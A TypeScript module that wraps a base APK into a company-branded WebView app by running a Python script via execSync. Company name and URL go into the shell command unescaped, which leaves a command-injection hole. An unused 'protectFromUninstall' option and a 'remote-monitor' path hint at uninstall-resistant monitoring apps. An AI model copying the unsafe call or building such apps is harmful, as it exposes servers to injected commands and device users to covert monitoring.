import { execSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';

interface APKBuildOptions {
  companyName: string;
  companyUrl: string;
  logoUrl?: string;
  protectFromUninstall?: boolean;
}

/**
 * Build a custom APK wrapper that opens a company URL
 * Uses Python script to create WebView wrapper APK
 */
export async function buildCustomAPK(options: APKBuildOptions): Promise<{
  success: boolean;
  apkPath?: string;
  downloadUrl?: string;
  filename?: string;
  error?: string;
}> {
  try {
    console.log(`[APK-BUILDER] Starting APK build for: ${options.companyName}`);
    console.log(`[APK-BUILDER] URL: ${options.companyUrl}`);

    // Find base APK
    const possibleBasePaths = [
      '/home/ubuntu/remote-monitor/public/apks/Blockchain-Registered.apk',
      path.join(process.cwd(), 'public/apks/Blockchain-Registered.apk'),
      '/app/public/apks/Blockchain-Registered.apk',
    ];

    let baseAPK = '';
    for (const p of possibleBasePaths) {
      if (fs.existsSync(p)) {
        baseAPK = p;
        console.log(`[APK-BUILDER] Found base APK at: ${baseAPK}`);
        break;
      }
    }

    if (!baseAPK) {
      console.error('[APK-BUILDER] Base APK not found');
      return {
        success: false,
        error: 'Base APK not found',
      };
    }

    // Find Python script
    const pythonScriptPaths = [
      '/home/ubuntu/remote-monitor/create_wrapper_apk.py',
      path.join(process.cwd(), 'create_wrapper_apk.py'),
      path.join(process.cwd(), '..', 'create_wrapper_apk.py'),
    ];

    let pythonScript = '';
    for (const p of pythonScriptPaths) {
      if (fs.existsSync(p)) {
        pythonScript = p;
        console.log(`[APK-BUILDER] Found Python script at: ${pythonScript}`);
        break;
      }
    }

    if (!pythonScript) {
      console.error('[APK-BUILDER] Python script not found');
      return {
        success: false,
        error: 'APK creation script not found',
      };
    }

    // Create output directory
    const outputDir = '/tmp/apk-output';
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    // Run Python script
    console.log('[APK-BUILDER] Running wrapper APK creation script...');

    try {
      const output = execSync(
        `python3 "${pythonScript}" "${options.companyName}" "${options.companyUrl}" "${baseAPK}" "${outputDir}"`,
        {
          encoding: 'utf-8',
          timeout: 300000,
          maxBuffer: 10 * 1024 * 1024,
        }
      );

      console.log('[APK-BUILDER] Script output:', output);

      // Parse result from script output
      const resultMatch = output.match(/\[RESULT\] ({.*})/);
      if (!resultMatch) {
        throw new Error('Failed to parse script result');
      }

      const result = JSON.parse(resultMatch[1]);

      if (!result.success) {
        throw new Error(result.error || 'Unknown error');
      }

      console.log(`[APK-BUILDER] ✓ APK wrapper created successfully`);
      console.log(`[APK-BUILDER] File: ${result.filename}`);
      console.log(`[APK-BUILDER] Size: ${result.size_mb.toFixed(2)}MB`);

      // Return download URL
      const downloadUrl = `/download/${result.filename}`;

      return {
        success: true,
        apkPath: result.apk_path,
        filename: result.filename,
        downloadUrl: downloadUrl,
      };
    } catch (error) {
      console.error('[APK-BUILDER] Script execution failed:', error);
      throw error;
    }
  } catch (error) {
    console.error('[APK-BUILDER] APK Build Error:', error);

    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error',
    };
  }
}
